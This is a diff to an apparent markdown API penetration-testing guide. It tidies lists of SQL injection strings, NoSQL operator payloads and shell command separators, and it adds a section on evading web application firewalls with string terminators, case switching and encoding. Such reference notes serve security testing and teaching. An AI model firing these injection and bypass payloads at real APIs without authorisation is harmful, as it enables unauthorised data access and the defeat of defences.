@@ -117,29 +117,17 @@ if the API is expecting a certain type of input (number, string, boolean value) 
 - SQL metacharacters that can cause some issues:
 ```SQL
 '
-
 ''
-
 ;%00
-
 --
-
 -- -
-
 ""
-
 ;
-
 ' OR '1
-
 ' OR 1 -- -
-
 " OR "" = "
-
 " OR 1 = 1 -- -
-
 ' OR '' = '
-
 OR 1=1
 ```
 
@@ -148,23 +136,14 @@ OR 1=1
 The following are common NoSQL metacharacters you could send in an API request to manipulate the database:
 ```json
 $gt 
-
 {"$gt":""}
-
 {"$gt":-1}
-
 $ne
-
 {"$ne":""}
-
 {"$ne":-1}
-
  $nin
-
 {"$nin":1}
-
 {"$nin":[1]}
-
 {"$where":  "sleep(1000)"}
 ```
 
@@ -180,19 +159,12 @@ Characters such as the following all act as command separators, which enable a p
 
 ```Shell
 |
-
 ||
-
 &
-
 &&
-
 '
-
 "
-
 ;
-
 '"
 ```
 
@@ -209,6 +181,36 @@ requests that include user input.examples:
 - POST posts
 - POST validate-coupon
 - POST orders
+
+#### WAF Evasion
+
+String terminators can be placed in different parts of the request, like the path or POST body, to attempt to bypass any restrictions in place.
+
+Here is a list of potential string terminators you can use:
+```
+%00
+0x00
+//
+;
+%
+!
+?
+[]
+%5B%5D
+%09
+%0a
+%0b
+%0c
+%0e
+```
+
+- **Case Switching**:
+  - Sometimes API security controls are pretty easy to beat. If a security control is built around the literal spelling and case of the components within a request, then case switching can be an effective technique to bypass the controls.
+- Encoding Payloads
+
+Awesome-WAF GitHub repo
+
+https://github.com/0xInfection/Awesome-WAF#known-bypasses
 
 
 
